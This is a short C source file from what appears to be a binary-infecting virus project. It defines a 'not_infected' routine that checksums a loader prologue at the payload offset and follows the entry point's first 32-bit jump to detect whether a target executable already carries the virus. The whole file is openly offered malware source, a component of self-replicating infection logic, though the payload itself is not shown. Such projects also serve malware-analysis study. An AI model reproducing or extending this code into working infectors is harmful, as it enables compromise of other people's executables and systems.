#include "virus.h"
#include "jumps.h"
#include "utils.h"
#include "compiler_utils.h"
#include "errors.h"

/*
** Don't infect again if current binary is already our client.
*/
static bool	check_signature(struct safe_ptr ref, size_t offset, size_t size)
{
	const uint8_t	*signature = safe(ref, offset, size);

	if (signature == NULL)
		return errors(ERR_FILE, _ERR_F_READ_SIGNATURE, _ERR_T_CHECK_SIGNATURE);

	if (checksum(signature, size) == LOADER_PROLOGUE_SUM)
		return errors(ERR_VIRUS, _ERR_V_ALREADY_INFECTED, _ERR_T_CHECK_SIGNATURE);

	return true;
}

static bool	check_client_jump(struct safe_ptr file_ref, size_t entry_offset)
{
	const void	*jump = find_first_jmp32(file_ref, entry_offset);

	// drop this method if client can't be parsed
	if (jump == NULL)
		return true;

	const size_t	jump_offset = jump - file_ref.ptr;
	const void	*jump_destination = get_jmp32_destination(file_ref, jump_offset);

	if (jump_destination == NULL)
		return errors(ERR_THROW, _ERR_NO, _ERR_T_CHECK_CLIENT_JUMP);

	const size_t	loader_offset = jump_destination - file_ref.ptr;

	return check_signature(file_ref, loader_offset, LOADER_PROLOGUE_LEN);
}

static bool	check_loader_position(struct safe_ptr file_ref, size_t loader_offset)
{
	return check_signature(file_ref, loader_offset, LOADER_PROLOGUE_LEN);
}

bool		not_infected(const struct entry *file_entry,
			struct safe_ptr file_ref)
{
	const size_t	entry_offset  = file_entry->entry_offset;
	const size_t	loader_offset = file_entry->payload_offset;

	if (!check_loader_position(file_ref, loader_offset)
	|| !check_client_jump(file_ref, entry_offset))
		return errors(ERR_THROW, _ERR_NO, _ERR_T_NOT_INFECTED);

	return true;
}
